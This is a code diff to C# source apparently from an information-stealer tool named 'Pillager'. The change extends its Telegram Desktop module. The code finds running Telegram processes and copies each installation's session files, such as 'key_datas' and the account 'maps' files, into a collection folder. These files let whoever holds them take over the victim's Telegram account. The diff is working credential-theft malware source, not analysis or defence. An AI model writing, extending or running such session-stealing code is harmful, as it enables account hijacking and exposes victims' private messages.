@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 
 namespace Pillager.Messengers
@@ -9,15 +11,8 @@ namespace Pillager.Messengers
 
         public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
 
-        public static void Save(string path)
-        {
-            try
+        private static string[] sessionpaths =
             {
-                if (!Directory.Exists(MessengerPath)) return;
-                string savepath = Path.Combine(path, MessengerName);
-                Directory.CreateDirectory(savepath);
-                string[] sessionpaths =
-                {
                 "tdata\\key_datas",
                 "tdata\\D877F783D5D3EF8Cs",
                 "tdata\\D877F783D5D3EF8C\\maps",
@@ -30,17 +25,40 @@ namespace Pillager.Messengers
                 "tdata\\0CA814316818D8F6s",
                 "tdata\\0CA814316818D8F6\\maps",
             };
-                Directory.CreateDirectory(Path.Combine(savepath, "tdata"));
-                Directory.CreateDirectory(savepath + "\\tdata\\D877F783D5D3EF8C");
-                Directory.CreateDirectory(savepath + "\\tdata\\A7FDF864FBC10B77");
-                Directory.CreateDirectory(savepath + "\\tdata\\F8806DD0C461824F");
-                Directory.CreateDirectory(savepath + "\\tdata\\C2B05980D9127787");
-                Directory.CreateDirectory(savepath + "\\tdata\\0CA814316818D8F6");
-                foreach (var sessionpath in sessionpaths)
+
+        public static void Save(string path)
+        {
+            try
+            {
+                Process[] tgProcesses = Process.GetProcessesByName("Telegram");
+                if (!Directory.Exists(MessengerPath) && tgProcesses.Length == 0) return;
+                List<string> tgpaths = new List<string>();
+                if (tgProcesses.Length > 0)
                 {
-                    if (File.Exists(Path.Combine(MessengerPath, sessionpath)))
+                    foreach (var tgProcess in tgProcesses)
                     {
-                        File.Copy(Path.Combine(MessengerPath, sessionpath), Path.Combine(savepath, sessionpath), true);
+                        tgpaths.Add(Path.GetDirectoryName(tgProcess.MainModule.FileName));
+                    }
+                }
+                if (!tgpaths.Contains(MessengerPath))
+                    tgpaths.Add(MessengerPath);
+                for (int i = 0; i < tgpaths.Count; i++)
+                {
+                    string savepath = Path.Combine(path, MessengerName);
+                    Directory.CreateDirectory(savepath);
+
+                    Directory.CreateDirectory(Path.Combine(savepath, "tdata_" + i));
+                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\D877F783D5D3EF8C");
+                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\A7FDF864FBC10B77");
+                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\F8806DD0C461824F");
+                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\C2B05980D9127787");
+                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\0CA814316818D8F6");
+                    foreach (var sessionpath in sessionpaths)
+                    {
+                        if (File.Exists(Path.Combine(tgpaths[i], sessionpath)))
+                        {
+                            File.Copy(Path.Combine(tgpaths[i], sessionpath), Path.Combine(savepath, sessionpath.Replace("tdata", "tdata_" + i)), true);
+                        }
                     }
                 }
             }
